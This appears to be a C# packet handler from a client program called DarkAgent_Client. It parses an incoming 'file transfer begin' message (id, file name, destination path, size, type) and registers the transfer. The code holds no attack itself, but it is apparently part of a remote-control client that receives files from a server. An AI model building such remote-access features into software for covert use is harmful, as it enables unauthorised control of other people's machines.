using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Objects;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Receive
{
    class R_FileTransferBegin : ReceiveBasePacket
    {
        public R_FileTransferBegin(ClientConnect client, byte[] packet)
            : base(client, packet)
        {
        }

        private FileTransfer info = new FileTransfer();

        public override void Read()
        {
            info.Id = ReadShort();
            info.FileName = ReadString();
            info.Destination = ReadString();
            info.FileSize = ReadLong();
            info.type = ReadShort();
        }

        public override void Run()
        {
            if (!Client.fileTransfer.ContainsKey(info.Id))
                Client.fileTransfer.Add(info.Id, info);
        }
    }
}